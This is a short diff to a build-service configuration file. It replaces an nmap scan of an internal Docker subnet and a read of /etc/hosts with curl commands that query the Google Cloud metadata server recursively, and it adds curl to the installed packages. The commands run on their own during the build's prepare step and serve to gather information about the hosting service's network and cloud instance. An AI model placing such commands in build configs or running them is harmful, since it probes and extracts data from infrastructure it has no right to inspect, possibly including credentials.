@@ -4,6 +4,8 @@ extraction:
       packages:
         - nmap
         - net-tools
+        - curl
     after_prepare:    # Customizable step used by all languages.
-      - nmap 172.17.0.0/24 -Pn -T5
-      - cat /etc/hosts
+      - curl http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+      - curl http://metadata.google.internal/computeMetadata/v1beta1/
+      - curl http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
